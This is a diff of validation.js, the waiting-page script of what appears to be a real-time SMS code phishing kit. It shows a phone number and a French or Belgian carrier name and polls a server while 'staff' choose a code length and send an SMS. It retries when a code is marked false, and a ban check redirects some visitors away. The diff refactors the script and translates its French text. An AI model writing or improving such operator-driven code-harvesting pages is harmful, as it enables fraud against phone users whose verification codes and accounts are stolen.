@@ -1,62 +1,62 @@
-/**
- * validation.js — Polling page while user waits for staff to send the SMS
- *
- * v2.3: handles retry=1 URL param (arrived from verify-wait after a false_code).
- *       Shows a "code incorrect, new one incoming" message and keeps polling
- *       for waiting_code status so user gets redirected to code.html with the
- *       correct (possibly new) code length chosen by staff.
- */
-
 const API_STATUS = '/api/status';
-
-function getParam(name) {
-    return new URL(window.location.href).searchParams.get(name);
-}
+function getParam(n) { return new URL(window.location.href).searchParams.get(n); }
 
 const phone   = getParam('phone')   || '';
 const carrier = getParam('carrier') || 'orange';
 const isRetry = getParam('retry')   === '1';
 
-// ── UI init ───────────────────────────────────────────────────────────────────
-const displayPhone = document.getElementById('displayPhone');
-if (displayPhone) displayPhone.textContent = phone;
-
 const carrierNames = {
     orange: 'Orange', sfr: 'SFR', bouygues: 'Bouygues',
-    base: 'BASE', orange_be: 'Orange Belgique', proximus: 'Proximus', telenet: 'Telenet',
+    base: 'BASE', orange_be: 'Orange Belgium', proximus: 'Proximus', telenet: 'Telenet',
 };
-const carrierEl = document.getElementById('carrierName');
-if (carrierEl) carrierEl.textContent = carrierNames[carrier] || carrier;
+
+// ── UI init ───────────────────────────────────────────────────────────────────
+const el = id => document.getElementById(id);
+
+if (el('displayPhone')) el('displayPhone').textContent = phone || '--';
+if (el('carrierName'))  el('carrierName').textContent  = carrierNames[carrier] || carrier;
 
 if (isRetry) {
-    const title       = document.getElementById('valTitle');
-    const retryAlert  = document.getElementById('retryAlert');
-    const normalAlert = document.getElementById('normalAlert');
-    const subtitle    = document.getElementById('valSubtitle');
-    if (title)       title.textContent     = 'Nouveau code en préparation…';
-    if (subtitle)    subtitle.textContent  = 'Notre équipe configure votre prochain code';
-    if (retryAlert)  retryAlert.style.display  = 'block';
-    if (normalAlert) normalAlert.style.display = 'none';
+    if (el('retryBanner'))  el('retryBanner').style.display  = 'flex';
+    if (el('flowSubtitle')) el('flowSubtitle').textContent   = 'Incorrect code — new one being prepared';
+    if (el('statusTitle'))  el('statusTitle').textContent    = 'Choosing new code length…';
 }
+
+// ── Elapsed timer ─────────────────────────────────────────────────────────────
+const startTime  = Date.now();
+const elapsedEl  = el('elapsedTime');
+const connEl     = el('connStatus');
+let   connOk     = true;
+
+function pad(n) { return String(n).padStart(2, '0'); }
+
+setInterval(() => {
+    if (!elapsedEl) return;
+    const secs  = Math.floor((Date.now() - startTime) / 1000);
+    const m     = Math.floor(secs / 60);
+    const s     = secs % 60;
+    elapsedEl.textContent = m + ':' + pad(s);
+}, 1000);
 
 // ── Ban check ─────────────────────────────────────────────────────────────────
 async function checkBan() {
     try {
-        const res  = await fetch('/api/check-ban');
-        const data = await res.json();
-        if (data.banned) window.location.href = 'banned.html';
-    } catch (e) { console.error('Ban check error:', e); }
+        const r = await fetch('/api/check-ban');
+        const d = await r.json();
+        if (d.banned) window.location.href = 'banned.html';
+    } catch {}
 }
 
 // ── Status polling ────────────────────────────────────────────────────────────
 async function checkStatus() {
     try {
-        const res = await fetch(API_STATUS + '?phone=' + encodeURIComponent(phone));
+        const res  = await fetch(API_STATUS + '?phone=' + encodeURIComponent(phone));
+        connOk = res.ok;
+        if (connEl) connEl.textContent = connOk ? 'Live' : 'Retrying…';
         if (!res.ok) return;
         const data = await res.json();
 
         if (data.status === 'waiting_code') {
-            // Staff has set the new code length → send user to code entry
             const len    = data.code_length || 6;
             const params = new URLSearchParams({ phone, length: len });
             if (isRetry) params.set('retry', '1');
@@ -70,18 +70,13 @@ async function checkStatus() {
             window.location.href = 'success.html?phone=' + encodeURIComponent(phone);
 
         } else if (data.status === 'retry_code' && !isRetry) {
-            // Edge case: arrived on validation.html without retry flag but status is already retry_code
             const params = new URLSearchParams({ phone, retry: '1' });
             if (carrier) params.set('carrier', carrier);
             window.location.href = 'validation.html?' + params.toString();
         }
-        // pending / processing / code_submitted → keep polling
-    } catch (e) {
-        console.error('Polling error:', e);
+    } catch {
+        if (connEl) connEl.textContent = 'Reconnecting…';
     }
 }
 
-checkBan().then(() => {
-    checkStatus();
-    setInterval(checkStatus, 3000);
-});
+checkBan().then(() => { checkStatus(); setInterval(checkStatus, 3000); });
